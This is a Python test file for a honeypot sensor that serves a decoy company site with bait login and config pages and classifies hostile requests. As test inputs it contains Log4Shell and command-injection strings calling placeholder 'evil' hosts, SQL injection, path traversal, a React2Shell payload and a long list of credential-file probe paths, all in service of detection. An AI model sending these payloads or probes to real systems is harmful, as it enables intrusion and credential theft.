#!/usr/bin/env python3
"""Tests for the decoy sensor's pure logic. Run: python3 sensors/test_decoy_sensor.py"""

import os
import sys

sys.path.insert(0, os.path.dirname(__file__))
from signatures import EXPLOIT_SIGNATURES, LOGIN_PATHS, classify, is_login_attempt  # noqa: E402

from decoy_sensor import (  # noqa: E402
    BAIT_DIR,
    BAIT_PAGES,
    DEFAULT_THEME_DIR,
    _State,
    asset_cache_control,
    client_ip,
    content_type_for,
    http_fingerprint,
    fill_bait,
    fill_origin,
    load_theme,
    mask_form,
    mask_value,
    parse_form,
    resolve_route,
)

COMMON = {"password", "123456", "admin"}
THEME = load_theme(DEFAULT_THEME_DIR)


# --- classify -------------------------------------------------------------

def test_a_normal_browser_request_is_benign():
    ua = "Mozilla/5.0 (X11; Linux x86_64) Firefox/142.0"
    assert classify("GET", "/products", "", "", ua) == "benign"


def test_a_scanner_user_agent_is_flagged():
    assert classify("GET", "/", "", "", "Mozilla/5.00 (Nikto/2.5.0)") == "scanner_ua"
    assert classify("GET", "/", "", "", "curl/8.5.0") == "scanner_ua"


def test_probing_sensitive_paths_is_dirbust():
    assert classify("GET", "/.env", "", "", "x") == "dirbust"
    assert classify("GET", "/wp-content/debug.log", "", "", "x") == "dirbust"


def test_posting_to_a_fake_login_is_login():
    assert classify("POST", "/wp-login.php", "", "log=admin&pwd=admin", "x") == "login"


def test_sql_injection_markers_win_over_dirbust():
    sig = classify("GET", "/products", "id=1 union select password from users", "", "x")
    assert sig == "sqli"


def test_path_traversal_is_detected():
    assert classify("GET", "/static", "file=../../../../etc/passwd", "", "x") == "traversal"


def test_log4shell_is_cve_probe_and_outranks_everything():
    # jndi in the UA-ish header space; even with a scanner UA it stays cve_probe.
    sig = classify("GET", "/", "x=${jndi:ldap://evil/a}", "", "sqlmap/1.7")
    assert sig == "cve_probe"


def test_command_injection_is_rce():
    assert classify("GET", "/cgi", "x=1;wget http://evil/x", "", "x") == "rce"


def test_url_encoded_payloads_are_decoded_before_matching():
    # A real scanner sends curl's UA with an encoded payload; the severe
    # signature must still win over scanner_ua.
    assert classify("GET", "/x", "id=1%20union%20select%20p", "", "curl/8") == "sqli"
    assert classify("GET", "/a", "x=%24%7Bjndi%3Aldap%3A%2F%2Fe%2Fa%7D", "", "curl/8") == "cve_probe"


def test_androxgh0st_is_a_cve_probe():
    # The botnet POSTs 0x[]=androxgh0st to / hunting Laravel debug mode.
    assert classify("POST", "/", "", "0x%5B%5D=androxgh0st", "") == "cve_probe"


def test_product_exploit_paths_are_cve_probes_matched_exactly():
    # Found by the overview's unrecognised-probes digest. These ban.
    ua = "Mozilla/5.0"
    for path in ("/developmentserver/metadatauploader", "/remote/login", "/debug/default/view",
                 "/web/debug/default/view", "/mcp", "/mcp/", "/api/mcp", "/sse", "/SSE"):
        assert classify("GET", path, "", "", ua) == "cve_probe", path
    assert classify("GET", "/remote/login", "lang=en", "", ua) == "cve_probe"
    assert classify("POST", "/developmentserver/metadatauploader", "CONTENTTYPE=MODEL", "", ua) == "cve_probe"
    # React2Shell posts its payload to any page, the site's own included.
    react2shell = ('------x\r\nContent-Disposition: form-data; name="0"\r\n\r\n'
                   '{"then": "$1:__proto__:then", "status": "resolved_model"}\r\n------x--')
    assert classify("POST", "/", "", react2shell, ua, THEME.pages, THEME.logins) == "cve_probe"
    # Only the exact path, so a real site's own pages never trip a ban.
    for path in ("/assessment", "/sse-events", "/mcp-guide", "/docs/mcp", "/remote/login-help", "/debug"):
        assert classify("GET", path, "", "", ua) == "benign", path


def test_secret_hunting_and_wordpress_recon_are_dirbust_and_never_ban():
    ua = "Mozilla/5.0"
    for method, path, query in (
        ("GET", "/appsettings.Production.json", ""), ("GET", "/.npmrc", ""), ("GET", "/credentials.json", ""),
        ("GET", "/secrets.yml", ""), ("GET", "/.DS_Store", ""), ("GET", "/.config/gcloud/credentials.db", ""),
        ("GET", "/.azure/accessTokens.json", ""), ("GET", "/.vscode/sftp.json", ""), ("GET", "/docker-compose.yml", ""),
        ("GET", "/.s3cfg", ""), ("GET", "/env.prod.js", ""), ("GET", "/", "url=.env"), ("GET", "/info.php", ""),
        ("GET", "/login", "pp=enable&pp=env"), ("GET", "/status", "full=true"),
        ("GET", "/wp-json/wp/v2/users", "per_page=50"), ("POST", "/", "rest_route=/batch/v1"),
        ("GET", "/wp-sitemap-users-1.xml", ""), ("GET", "/author-sitemap.xml", ""),
        ("GET", "/.config/llm/credentials", ""), ("GET", "/.claude/settings.local.json", ""),
        ("GET", "/.cursor/mcp.json", ""), ("GET", "/.llm/credentials", ""), ("GET", "/wp-config.php", ""),
        ("GET", "/.netrc", ""), ("GET", "/.pypirc", ""), ("GET", "/.travis.yml", ""), ("GET", "/parameters.yml", ""),
        ("GET", "/settings.py", ""), ("GET", "/storage/logs/laravel.log", ""), ("GET", "/", "author=1&feed=rss2"),
        ("POST", "/graphql", ""), ("POST", "/api/graphql", ""),
    ):
        assert classify(method, path, query, "", ua) == "dirbust", (method, path, query)
    assert "dirbust" not in EXPLOIT_SIGNATURES


def test_the_decoys_own_pages_are_never_flagged():
    for path in THEME.pages:
        assert classify("GET", path, "", "", "Mozilla/5.0 Firefox/142.0", THEME.pages, THEME.logins) == "benign", path


def test_every_credential_post_is_a_login_attempt_whatever_its_signature():
    assert is_login_attempt("POST", "/phpmyadmin/index.php")
    assert is_login_attempt("POST", "/administrator/index.php")
    assert not is_login_attempt("GET", "/wp-login.php")
    assert not is_login_attempt("POST", "/contact")
    # A payload in the username still classifies as the attack...
    assert classify("POST", "/wp-login.php", "", "log=admin'+or+1=1--&pwd=x", "") == "sqli"
    # ...while is_login_attempt keeps it on the Credentials page.


def test_a_visitors_message_on_a_site_form_is_never_an_exploit():
    # A no-JS visitor submitting /contact: quotes, dashes and a backtick in
    # free text must not read as sqli/rce (exploits are banned).
    body = "name=Pat&message=I+said+%27hi%27+--+and+used+a+%60backtick%60+%24%28lol%29"
    assert classify("POST", "/contact", "", body, "Mozilla/5.0 Firefox/142.0", THEME.pages) == "benign"


def test_the_themes_sign_in_form_is_a_login_decoded_like_any_other():
    ua = "Mozilla/5.0 Firefox/142.0"
    body = "email=pat%40example.com&password=x"
    assert classify("POST", "/portal", "", body, ua, THEME.pages, THEME.logins) == "login"
    assert is_login_attempt("POST", "/portal", THEME.logins)
    assert not is_login_attempt("GET", "/portal", THEME.logins)
    assert not is_login_attempt("POST", "/portal")   # without the theme's logins it's just a page
    # Only bots post it (a browser's script stops the submit), so a payload in
    # the email field is the attack, as on the bait logins.
    attack = "email=admin%27+or+1%3D1--&password=x"
    assert classify("POST", "/portal", "", attack, ua, THEME.pages, THEME.logins) == "sqli"


def test_the_themes_sign_in_forms_post_to_its_logins_and_never_leave_a_browser():
    import re
    forms = 0
    for name in sorted(os.listdir(THEME.root)):
        if not name.endswith(".html"):
            continue
        html = (THEME.root / name).read_text(encoding="utf-8")
        # Every page's "Sign in" button goes to the portal.
        assert '<a class="btn ghost sm" href="/portal">Sign in</a>' in html, f"{name}: Sign in link"
        if 'type="password"' not in html:
            continue
        for tag in re.findall(r'<form[^>]*method="post"[^>]*>', html, re.IGNORECASE):
            forms += 1
            action = re.search(r'action="([^"]+)"', tag).group(1)
            assert action in THEME.logins, f"{name} posts to {action}, not one of the theme's logins"
            assert "data-demo" in tag, f"{name}: a browser would send what the visitor typed"
    assert forms >= 2
    failed = (THEME.root / THEME.logins["/portal"]).read_text(encoding="utf-8")
    assert '<p class="form-msg bad" role="alert">Incorrect email or password.</p>' in failed


def test_no_theme_form_leaves_a_browser():
    # The README's privacy promise: a visitor's typing never reaches the decoy.
    # Only clients that post a form directly (bots) are recorded.
    import re
    for name in sorted(os.listdir(THEME.root)):
        if name.endswith(".html"):
            html = (THEME.root / name).read_text(encoding="utf-8")
            for tag in re.findall(r"<form\b[^>]*>", html, re.IGNORECASE):
                assert "data-demo" in tag, f"{name}: {tag}"


def test_long_paragraphs_never_end_on_a_lone_word():
    # CSS balances short blocks; browsers stop balancing long ones (on phones),
    # so a longer paragraph keeps its last three words together with &nbsp;
    # (two when three would run past 24 characters and risk overflowing).
    # Fix with: python3 ~/qa-scripts/bawls-typeset.py
    import re
    for name in sorted(os.listdir(THEME.root)):
        if not name.endswith(".html"):
            continue
        html = (THEME.root / name).read_text(encoding="utf-8")
        for m in re.finditer(r"<(p|li|blockquote)\b[^>]*>(.*?)</\1>", html, re.S):
            text = re.sub(r"<[^>]+>", "", m.group(2)).replace("&nbsp;", "\u00a0").rstrip()
            words = re.findall(r"[^\s\u00a0]+", text)
            if len(words) < 12:
                continue
            joined = 3 if len(" ".join(words[-3:])) <= 24 else 2
            tail = re.split(r"[ \t\r\n]+", text)[-1]
            assert len(re.findall(r"[^\u00a0]+", tail)) >= joined, \
                f"{name}: \"...{text[-40:]}\" can end on a lone word (run bawls-typeset.py)"


def test_every_inline_svg_has_its_own_size():
    # Without width/height an inline SVG fills the page until the stylesheet
    # lands, so a slow or early paint flashes a giant logo.
    import re
    for name in sorted(os.listdir(THEME.root)):
        if name.endswith(".html"):
            for tag in re.findall(r"<svg\b[^>]*>", (THEME.root / name).read_text(encoding="utf-8")):
                assert re.search(r'\swidth="\d+"', tag) and re.search(r'\sheight="\d+"', tag), f"{name}: {tag}"


def test_every_asset_link_carries_the_files_current_hash():
    # Versioned assets are cached for a year (immutable), so a link must change
    # whenever its file does. Fix with: python3 ~/qa-scripts/bawls-stamp-assets.py
    import hashlib
    import re
    for name in sorted(os.listdir(THEME.root)):
        if not name.endswith(".html"):
            continue
        html = (THEME.root / name).read_text(encoding="utf-8")
        refs = re.findall(r'(?:href|src)="/assets/([^"]*)"', html)
        assert refs, f"{name} links no assets"
        for ref in refs:
            rel, _, version = ref.partition("?v=")
            current = hashlib.sha256((THEME.root / "assets" / rel).read_bytes()).hexdigest()[:10]
            assert version == current, f"{name}: /assets/{ref} should be ?v={current} (run bawls-stamp-assets.py)"


def test_only_versioned_assets_are_cached_for_long():
    assert "immutable" in asset_cache_control("v=35e9a62d0f")
    assert "max-age=31536000" in asset_cache_control("v=35e9a62d0f")
    assert asset_cache_control("") is None


def test_the_theme_script_never_talks_to_the_network():
    # The privacy promise behind the demo forms and the support chat: what a
    # visitor types stays in their browser. No way to send it may creep in.
    import re
    script = (THEME.root / "assets" / "site.js").read_text(encoding="utf-8")
    for api in ("fetch(", "XMLHttpRequest", "sendBeacon", "WebSocket", "EventSource",
                "RTCPeerConnection", "new Image", ".submit(", "import("):
        assert api not in script, f"site.js uses {api}"
    assert not re.search(r"\baction=", script), "site.js builds a form that posts somewhere"


def test_links_in_the_theme_script_go_somewhere():
    import re
    script = (THEME.root / "assets" / "site.js").read_text(encoding="utf-8")
    hrefs = re.findall(r'href="(/[^"#]*)', script)
    assert hrefs, "expected the chat replies to link somewhere"
    for href in hrefs:
        assert href in THEME.pages, f"site.js links to {href}, which 404s"


def test_every_link_in_the_theme_goes_somewhere():
    import re
    ids = {}
    for path, filename in THEME.pages.items():
        if filename.endswith(".html"):
            ids[path] = set(re.findall(r'id="([^"]+)"', (THEME.root / filename).read_text(encoding="utf-8")))
    for name in sorted(os.listdir(THEME.root)):
        if not name.endswith(".html"):
            continue
        for href in re.findall(r'href="(/[^"]*)"', (THEME.root / name).read_text(encoding="utf-8")):
            path, _, fragment = href.partition("#")
            path = path.partition("?")[0]
            if path.startswith("/assets/"):
                assert (THEME.root / path.lstrip("/")).is_file(), f"{name}: {href}"
                continue
            assert path in THEME.pages, f"{name} links to {href}, which 404s"
            if fragment:
                assert fragment in ids.get(path, set()), f"{name} links to {href}: no such anchor"


def test_every_fake_login_form_posts_to_a_served_login_path():
    import re
    site = str(BAIT_DIR)
    forms = 0
    for name in sorted(os.listdir(site)):
        if not name.endswith(".html"):
            continue
        html = open(os.path.join(site, name), encoding="utf-8").read()
        if 'type="password"' not in html or name == "browser-check.html":
            continue
        for action in re.findall(r'<form[^>]*method="post"[^>]*action="([^"]+)"', html, re.IGNORECASE):
            forms += 1
            assert action in LOGIN_PATHS, f"{name} posts to {action}, not a login path"
            assert resolve_route(action, THEME)[2] == "bait", f"{name} posts to {action}, which 404s"
    assert forms >= 3


# --- themes ---------------------------------------------------------------

def test_the_default_theme_is_complete():
    assert THEME.name == "Bawls Inc."
    assert THEME.pages["/"] == "index.html" and "/investors" in THEME.flaky
    for filename in [*THEME.pages.values(), *THEME.logins.values(), THEME.not_found, THEME.unavailable]:
        assert (THEME.root / filename).is_file(), filename
    # Every bait file exists, and none of it lives in the theme.
    for filename, _ in BAIT_PAGES.values():
        assert (BAIT_DIR / filename).is_file(), filename
        assert not (THEME.root / filename).exists(), f"bait {filename} leaked into the theme"


def _write_theme(root, pages, files, logins=None):
    import json
    root.mkdir(parents=True)
    for name in files:
        (root / name).write_text("<h1>x</h1>")
    data = {"name": "T", "pages": pages, "not_found": "404.html", "unavailable": "503.html"}
    if logins is not None:
        data["logins"] = logins
    (root / "theme.json").write_text(json.dumps(data))


def test_a_broken_theme_is_rejected():
    import tempfile
    from pathlib import Path
    with tempfile.TemporaryDirectory() as tmp:
        tmp = Path(tmp)
        _write_theme(tmp / "ok", {"/": "index.html"}, ["index.html", "404.html", "503.html"])
        assert load_theme(tmp / "ok").pages == {"/": "index.html"}
        assert load_theme(tmp / "ok").logins == {}   # "logins" is optional
        page, errors = {"/": "index.html"}, ["index.html", "404.html", "503.html"]
        for name, pages, files, logins in (
            ("missing", {"/": "index.html"}, ["404.html", "503.html"], None),                      # page file absent
            ("escape", {"/": "../ok/index.html"}, ["404.html", "503.html"], None),                 # path leaves the theme
            ("bait", {"/wp-login.php": "index.html"}, errors, None),                               # shadows bait
            ("login-missing", page, errors, {"/signin": "failed.html"}),                           # failed page absent
            ("login-bait", page, errors + ["failed.html"], {"/wp-login.php": "failed.html"}),      # shadows bait
        ):
            _write_theme(tmp / name, pages, files, logins)
            try:
                load_theme(tmp / name)
            except ValueError:
                continue
            raise AssertionError(f"{name} theme was accepted")


# --- resolve_route --------------------------------------------------------

def test_known_pages_map_to_site_files():
    assert resolve_route("/", THEME) == (200, "index.html", "page")
    assert resolve_route("/products", THEME) == (200, "products.html", "page")


def test_a_sign_in_post_gets_the_failed_sign_in_page():
    assert resolve_route("/portal", THEME) == (200, "portal.html", "page")
    assert resolve_route("/portal", THEME, "POST") == (200, "portal-failed.html", "page")
    # Other pages answer a POST the way they answer a GET.
    assert resolve_route("/contact", THEME, "POST") == (200, "contact.html", "page")


def test_bait_paths_serve_plausible_pages():
    assert resolve_route("/wp-login.php", THEME) == (200, "wp-login.html", "bait")
    assert resolve_route("/.env", THEME) == (200, "dotenv.txt", "bait")


def test_new_bait_and_known_paths_resolve():
    assert resolve_route("/.git/HEAD", THEME)[2] == "bait"
    assert resolve_route("/actuator/env", THEME) == (200, "actuator-env.json", "bait")
    assert resolve_route("/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php", THEME)[2] == "bait"
    assert resolve_route("/sitemap.xml", THEME) == (200, "sitemap.xml", "page")
    assert resolve_route("/favicon.ico", THEME) == (200, "favicon.svg", "page")
    # built-out corporate pages (clean URLs)
    assert resolve_route("/pricing", THEME) == (200, "pricing.html", "page")
    assert resolve_route("/products/ball-pro", THEME) == (200, "product-ball-pro.html", "page")
    assert resolve_route("/press/series-b", THEME) == (200, "news-series-b.html", "page")


def test_content_type_by_extension():
    assert "json" in content_type_for("x.json")
    assert content_type_for("favicon.svg") == "image/svg+xml"
    assert content_type_for("sitemap.xml").startswith("application/xml")
    assert content_type_for("index.html").startswith("text/html")
    assert content_type_for("assets/site.css").startswith("text/css")
    assert content_type_for("assets/site.js").startswith("text/javascript")


def test_unknown_paths_get_the_branded_404():
    assert resolve_route("/this-does-not-exist", THEME) == (404, "404.html", "error")


# --- client_ip ------------------------------------------------------------

def test_the_socket_peer_is_used_when_not_behind_the_proxy():
    # A direct client (peer is not the trusted proxy) — XFF is ignored.
    assert client_ip("203.0.113.9", "1.2.3.4", "127.0.0.1") == "203.0.113.9"


def test_a_forged_forwarded_header_cannot_spoof_the_source():
    # Behind the proxy (peer 127.0.0.1): the proxy appends the true client last,
    # so a client-forged left-hand value does not win.
    xff = "9.9.9.9, 203.0.113.50"  # "9.9.9.9" is the forged part
    assert client_ip("127.0.0.1", xff, "127.0.0.1") == "203.0.113.50"


def test_forwarded_header_is_used_only_from_the_trusted_proxy():
    assert client_ip("127.0.0.1", "198.51.100.7", "127.0.0.1") == "198.51.100.7"


# --- masking --------------------------------------------------------------

def test_a_common_password_is_kept_as_dictionary_data():
    assert mask_value("pwd", "password", COMMON) == "password"


def test_an_uncommon_secret_is_masked_to_its_length():
    assert mask_value("pwd", "Tr0ub4dour&3xtra", COMMON) == "[masked:16 chars]"


def test_non_secret_fields_pass_through():
    assert mask_value("username", "bob", COMMON) == "bob"


def test_mask_form_applies_per_field():
    form = {"log": "admin", "pwd": "hunter2longsecret", "api_key": "123456"}
    masked = mask_form(form, COMMON)
    assert masked["log"] == "admin"
    assert masked["pwd"] == "[masked:17 chars]"
    assert masked["api_key"] == "123456"  # on the common list, kept


def test_http_fingerprint_is_stable_for_the_same_shape():
    a = http_fingerprint("GET", "HTTP/1.1", ["Host", "User-Agent", "Accept"], "*/*", "gzip", "en")
    b = http_fingerprint("GET", "HTTP/1.1", ["Host", "User-Agent", "Accept"], "*/*", "gzip", "en")
    assert a == b and len(a) == 16


def test_http_fingerprint_changes_with_header_order():
    # Same headers, different order — a real tell between a browser and a tool.
    browserish = http_fingerprint("GET", "HTTP/1.1", ["Host", "User-Agent", "Accept", "Accept-Language", "Accept-Encoding"], "text/html", "gzip, br", "en-US")
    toolish = http_fingerprint("GET", "HTTP/1.1", ["User-Agent", "Host", "Accept"], "*/*", "", "")
    assert browserish != toolish


def test_parse_form_reads_urlencoded_and_ignores_other_bodies():
    assert parse_form(b"log=admin&pwd=x", "application/x-www-form-urlencoded") == {"log": "admin", "pwd": "x"}
    assert parse_form(b"{\"a\":1}", "application/json") == {}


def test_flood_cap_suppresses_overflow_and_summarizes_once():
    os.environ["DECOY_MAX_PER_MIN"] = "3"
    try:
        st = _State()
        ip = "203.0.113.200"
        assert [st.should_ship(ip) for _ in range(5)] == [True, True, True, False, False]
        summary = st.drain_suppressed()
        assert len(summary) == 1
        assert summary[0]["src_ip"] == ip
        assert summary[0]["raw"]["suppressed"] == 2
        assert summary[0]["raw"]["signature"] == "flood"
        assert st.drain_suppressed() == []  # draining resets the counter
    finally:
        del os.environ["DECOY_MAX_PER_MIN"]


def test_drain_sweeps_stale_rate_entries_and_summarizes():
    import time
    st = _State()
    now_bucket = int(time.time() // 60)
    st.rate = {
        "9.9.9.9": {"bucket": now_bucket - 5, "count": 300, "suppressed": 7},  # stale, overflowed
        "1.1.1.1": {"bucket": now_bucket, "count": 2, "suppressed": 0},         # current minute
    }
    events = st.drain_suppressed()
    # the stale flooder still produces a summary, then is swept from the map
    assert any(e["src_ip"] == "9.9.9.9" and e["raw"]["suppressed"] == 7 for e in events)
    assert "9.9.9.9" not in st.rate
    assert "1.1.1.1" in st.rate


def _run():
    tests = [(name, obj) for name, obj in sorted(globals().items())
             if name.startswith("test_") and callable(obj)]
    passed = 0
    for name, fn in tests:
        try:
            fn()
            print(f"  ok  {name}")
            passed += 1
        except AssertionError as error:
            print(f"  FAIL {name}: {error}")
        except Exception as error:  # noqa: BLE001
            print(f"  ERROR {name}: {error!r}")
    print(f"\n{passed}/{len(tests)} passed")
    return 0 if passed == len(tests) else 1


if __name__ == "__main__":
    sys.exit(_run())


def test_robots_and_sitemap_name_the_host_that_was_asked_for():
    sitemap = (DEFAULT_THEME_DIR / "sitemap.xml").read_bytes()
    filled = fill_origin(sitemap, "decoy.example", "203.0.113.5")
    assert b"<loc>https://decoy.example/products</loc>" in filled
    assert b"{{origin}}" not in filled
    robots = fill_origin((DEFAULT_THEME_DIR / "robots.txt").read_bytes(), "decoy.example:8443", "203.0.113.5")
    assert b"Sitemap: https://decoy.example:8443/sitemap.xml" in robots


def test_a_hostile_host_header_is_not_reflected():
    for host in ['evil.example"><script>', "a b", "", "x" * 300, "host/path"]:
        assert fill_origin(b"{{origin}}/", host, "203.0.113.5") == b"https://203.0.113.5/"
    assert fill_origin(b"{{origin}}/", "", "2001:db8::5") == b"https://[2001:db8::5]/"


def test_files_without_the_placeholder_are_untouched():
    assert fill_origin(b"<h1>Bawls</h1>", "decoy.example", "203.0.113.5") == b"<h1>Bawls</h1>"


def test_the_default_themes_robots_and_sitemap_name_no_domain_of_their_own():
    import re

    robots = (DEFAULT_THEME_DIR / "robots.txt").read_text()
    assert "Sitemap: {{origin}}/sitemap.xml" in robots
    assert "Disallow: /portal" in robots
    locations = re.findall(r"<loc>([^<]*)</loc>", (DEFAULT_THEME_DIR / "sitemap.xml").read_text())
    assert locations and all(loc.startswith("{{origin}}/") for loc in locations)


def test_secret_shaped_bait_is_assembled_only_when_served():
    import json
    import re

    on_disk = (BAIT_DIR / "config-json.json").read_bytes()
    assert b"_live_" not in on_disk
    served = json.loads(fill_bait(on_disk))
    assert re.fullmatch(r"sk_live_[0-9A-Za-z]{24,}", served["secret_key"])
    for path in BAIT_DIR.iterdir():
        assert b"{{" not in fill_bait(path.read_bytes()), path.name

